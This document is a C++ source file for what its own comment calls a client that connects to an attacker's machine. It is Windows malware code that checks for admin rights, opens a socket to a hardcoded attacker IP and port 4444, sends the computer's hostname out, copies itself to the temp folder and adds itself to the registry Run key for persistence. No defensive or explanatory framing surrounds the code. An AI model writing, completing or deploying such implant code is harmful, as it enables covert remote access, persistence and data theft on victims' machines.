// client.cpp
// this code will try to connect to attacker's machine

#include "client.h"

bool isAdmin() { // check is program running with admin rights
    bool isElevated = false;
    HANDLE token;
    TOKEN_ELEVATION elev;
    DWORD size;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
            isElevated = elev.TokenIsElevated;
        }
    }
    if (token) {
        CloseHandle(token);
        token = NULL;
    }
    return isElevated;
}

// connect to server
int Client::connect_to(short port, char *ip) {
    // FreeConsole(); // hide console window

    if (!isAdmin()) {
        MessageBox(NULL, "Run this as administrator!", "Fatal error", MB_ICONERROR | MB_OK);
        return -1;
    }

    DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0) {
        exit(1);
    }

    int sizeAddr = sizeof(addr);
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    connection = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(connection, (SOCKADDR*)&addr, sizeAddr) != 0) {
        MessageBox(NULL, "Socket connection error!", "Fatal error", MB_ICONERROR | MB_OK);
        printf("Error: %d\n", WSAGetLastError());
        return -1;
    }
}

// send computer name to server
void Client::get_computer_name(SOCKET socket) {
    char name[256];
    gethostname(name, sizeof(name));

    int result = send(socket, name, sizeof(name), 0);
    if (result == SOCKET_ERROR) printf("Error: %d\n", WSAGetLastError());
}

// add "client.exe" file to run on startup
void Client::run_on_startup()
{
    HKEY hKey;
    // const char* czExePath   = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";
    char temp_folder_path[MAX_PATH];
    GetTempPath(MAX_PATH, temp_folder_path);

    char temp_exe_path[MAX_PATH];
    strcpy_s(temp_exe_path, temp_folder_path);
    strcat_s(temp_exe_path, executableName);

    LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0 , KEY_WRITE,
                                &hKey);
    if (ERROR_SUCCESS == lnRes)
    {
        lnRes = RegSetValueEx(  hKey,
                                czStartName,
                                0,
                                REG_SZ,
                                (unsigned char*)temp_exe_path,
                                strlen(temp_exe_path) );
    }

    RegCloseKey(hKey);
}

// copy executable file to temp location
void Client::copy_to_temp()
{
    TCHAR filename[MAX_PATH];
    GetModuleFileName(NULL, filename, MAX_PATH);

    TCHAR szTempPathBuffer[MAX_PATH];
    GetTempPath(MAX_PATH, szTempPathBuffer);

    char temp_exe_path[MAX_PATH];
    strcpy_s(temp_exe_path, szTempPathBuffer);
    strcat_s(temp_exe_path, executableName);

    if (CopyFile(filename, temp_exe_path, FALSE) != 0)
        printf("Successfull copied to temp folder");
    else {
        std::cout << GetLastError() << "\n";
    }
}

int main() 
{
    Client main_client;
    // main_client.connect_to(4444, "192.168.31.135");
    // main_client.copy_to_temp();
    main_client.run_on_startup();
    // main_client.get_computer_name(main_client.connection);
    system("pause");

    return 0;
}